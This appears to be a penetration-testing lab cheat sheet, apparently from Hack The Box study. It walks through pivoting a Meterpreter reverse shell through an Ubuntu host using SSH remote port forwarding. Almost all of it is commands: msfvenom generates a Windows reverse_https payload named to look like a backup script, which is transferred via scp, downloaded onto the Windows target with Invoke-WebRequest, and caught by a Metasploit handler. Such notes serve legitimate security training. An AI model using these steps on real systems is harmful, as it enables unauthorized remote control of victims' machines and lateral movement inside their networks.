# Remote/Reverse Port Forwarding with SSH
## Attack Host
1. Create a payload using msfvenom with the Ubuntu IP address
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
2. Transfer the payload 
```
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```
## Ubuntu Pivot Host
3. Starting Python3 Webserver on Pivot Host
```
ubuntu@Webserver$ python3 -m http.server 8123
```
4. Transfer the file to the Windows Host on the internal network
## Windows Host
5. Downloading Payload from Windows Target
```
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```
## Attack Host
6. Start msfconsole
```
use exploit/multi/handler
```
```
set playload windows/x64/meterpreter/reverse_https
```
```
set lhost 0.0.0.0
```
```
set lport 8000
```
```
run
```
7. Using SSH -R
```
w1j0y@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
## Windows Host
8. Execute the backupscript.exe file
### Port forwarding flow
#### Executing backupscript.exe -> create a reverse shell back to the Ubuntu Host -> Ubuntu Host will forward the command on port 8000 to our Attack Host -> shell pivoted via the Ubuntu machine -> Meterpreter Shell